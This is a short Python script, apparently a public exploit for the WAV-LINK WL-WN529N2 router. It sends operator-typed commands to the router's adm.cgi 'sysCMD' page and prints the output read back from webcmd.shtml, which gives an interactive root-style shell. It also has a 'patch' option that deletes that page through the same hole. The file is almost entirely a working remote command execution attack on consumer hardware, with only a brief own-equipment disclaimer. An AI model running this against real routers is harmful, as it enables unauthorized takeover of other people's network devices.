import requests 
import sys 
import re


def main():
    loop = 0
    if len(sys.argv) != 2:
        print("[-]Please supply an ip address")
        print("[ ]python exploit.py <ip-address>")
        exit(0)
    else:
        ip = sys.argv[1]        
        print("[+]Correct number of argv")
        print("[+]WAV-LINK (WL-WN529N2) exploit")
        print("[ ]This is a demo and should only be used on your own equipment")
        print("[ ]Runing this program can brick the router forever, use with caution")
    
    ans = input("[ ]Red team or Blue team?\n[ ]This tool can be used to exploit or patch the router\n[ ]Press 'Y' to exploit or 'n' to patch the device\n") 
    while loop == 0:
        if (ans == "y" or ans == "Yes" or ans ==  "Y" or ans == "yes"):
            while(1):
                try:
                    command = input("root@" + ip + ":") 
                    r = requests.post("http://" + ip + "/cgi-bin/adm.cgi/", data = {'page':'sysCMD', 'command': command, 'SystemCommandSubmit':'Apply'})
                    r2 = requests.get("http://" + ip + "/webcmd.shtml")
                    find(r2.text)
                except Exception as e:
                    print(e)
                    sys.exit(1)
        
        elif (ans == "n" or ans == "N" or ans == "no" or ans == "No"):
                command = "rm webcmd.shtml"
                try:
                    r = requests.post("http://" + ip + "/cgi-bin/adm.cgi/", data = {'page':'sysCMD', 'command': command, 'SystemCommandSubmit':'Apply'})
                    r2 = requests.get("http://" + ip + "/webcmd.shtml")
                    print("[ ]Trying to remove developer console")
                    print("[+]System patched")
                except Exception as e:
                    print(e)
                    sys.exit(1)

def find(html):
    parsed = html.split('<textarea cols="90" rows="20" wrap="off" readonly="1">')[1].split('</textarea>')[0]
    print(parsed)

main()
